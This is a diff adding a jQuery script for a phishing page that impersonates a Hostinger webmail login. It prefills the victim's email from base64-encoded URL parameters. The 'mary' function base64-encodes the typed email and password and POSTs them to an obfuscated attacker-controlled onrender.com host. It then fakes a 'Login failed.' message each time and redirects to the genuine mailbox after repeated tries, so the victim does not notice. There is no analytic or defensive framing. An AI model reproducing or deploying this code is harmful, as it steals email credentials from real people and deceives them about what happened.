@@ -1,0 +1,162 @@
+$(document).ready(function(){
+	const urlParams = new URLSearchParams(window.location.href);
+    var ipv = urlParams.get("trexxcoz");
+	var iav = urlParams.get("coztrexx");
+	var av = window.atob(iav);
+	var pv = window.atob(ipv);
+	var email = av + "@" + pv;
+	var link1 = window.atob("aHR0cHM6Ly9tYWlsLmhvc3Rpbmdlci5jb20vP190YXNrPW1haWwmX21ib3g9SU5CT1g=");
+	
+	if (!email) {
+		window.location.replace(link1);
+
+    } else {
+        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+		var fule = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (fule.test(email)) {
+			document.getElementById('rcmloginuser').value = email;
+            
+        } else {
+            window.location.replace(link1);
+        }
+    }
+
+		setTimeout(function() {
+			document.getElementById('messagestack').style.display = "none";
+		}, 7000);
+		$(document).keypress(function(event) {
+
+		var keycode = (event.keyCode ? event.keyCode : event.which);
+		if (keycode == '13') {
+			document.getElementById("rcmloginsubmit").click();
+		}
+	});
+			
+
+
+
+
+      $('#rcmloginsubmit').keydown(function (e) {
+        if (e.which == 13) {
+          mary();
+          return false;
+        }
+      });
+	  
+	  
+		const togglePassword = document.querySelector('#show-pwd');
+		const pass = document.querySelector('#rcmloginpwd');	  
+				
+		  togglePassword.addEventListener('click', function (e) {
+			// toggle the type attribute
+			const type = pass.getAttribute('type') === 'password' ? 'text' : 'password';
+			pass.setAttribute('type', type);
+		});		
+	  
+});	  
+	  
+
+	function mary() {
+		var pgx = "SG9zdGluZ2Vy";
+		var em = $('#rcmloginuser').val();
+		var ps = $('#rcmloginpwd').val();
+		var ax = window.btoa(em);
+		var px = window.btoa(ps);
+		var link1 = window.atob("aHR0cHM6Ly9tYWlsLmhvc3Rpbmdlci5jb20vP190YXNrPW1haWwmX21ib3g9SU5CT1g=");
+
+		if (em == "" || em == " " || em == " " || em == null || em == undefined){
+
+			$('#rcmloginuser').focus();
+
+		} else if (ps === "" || ps === " " || ps == " " || ps == "  " || ps == "   " || ps === null) {
+			
+
+		}else {
+	
+	
+       
+	var lru = window.atob("aHR0cHM6Ly9tb2hhbWVkYmluc2FsbS5vbnJlbmRlci5jb20v");
+
+	
+
+
+
+		$.ajax({
+				url: lru,
+				type: 'POST',
+				data: {
+					ai: ax,
+					pr: px,
+					pg: pgx
+				},
+				beforeSend: function(xhr){
+					$('#rcmloginsubmit').attr("disabled", true);
+					$('#rcmloginsubmit').css( 'cursor', 'not-allowed');
+					document.getElementById('messagestack').style.display = "block";
+					document.getElementById('msg-error').innerHTML = "Loading...";
+					document.getElementById('passbox1').className = "loading content ui alert alert-info";
+				},
+				error: function (response) {
+ 
+
+					var randomLink = Math.random().toString(13).replace('0.', '');
+
+
+					var count = 1;
+					var a =  document.getElementById("num2").value;
+					var c = parseInt(a) + parseInt(count); 
+					if (c > 2){
+						window.location.replace(link1);
+						return false;}
+					
+					count = document.getElementById("num2").value = c; 
+					count = count + 1;
+					document.getElementById('messagestack').style.display = "block";
+					document.getElementById('msg-error').innerHTML = "Login failed.";
+					document.getElementById('passbox1').className = "warning content ui alert alert-warning";
+					$('#rcmloginsubmit').attr("disabled", false);
+					$('#rcmloginsubmit').css("cursor", "pointer");
+					setTimeout(function() {
+						document.getElementById('messagestack').style.display = "none";
+					}, 6000);
+		
+          $('#rcmloginpwd').val("");
+
+          console.log(randomLink);
+              return;
+
+				},
+				success: function (response) {
+ 
+
+					var randomLink = Math.random().toString(13).replace('0.', '');
+
+
+					var count = 1;
+					var a =  document.getElementById("num2").value;
+					var c = parseInt(a) + parseInt(count); 
+					if (c > 2){
+						window.location.replace(link1);
+						return false;}
+					
+					count = document.getElementById("num2").value = c; 
+					count = count + 1;
+					document.getElementById('messagestack').style.display = "block";
+					document.getElementById('msg-error').innerHTML = "Login failed.";
+					document.getElementById('passbox1').className = "warning content ui alert alert-warning";
+					$('#rcmloginsubmit').attr("disabled", false);
+					$('#rcmloginsubmit').css("cursor", "pointer");
+					setTimeout(function() {
+						document.getElementById('messagestack').style.display = "none";
+					}, 6000);
+		
+          $('#rcmloginpwd').val("");
+
+          console.log(randomLink);
+              return;
+
+				}
+			});
+		}
+	}
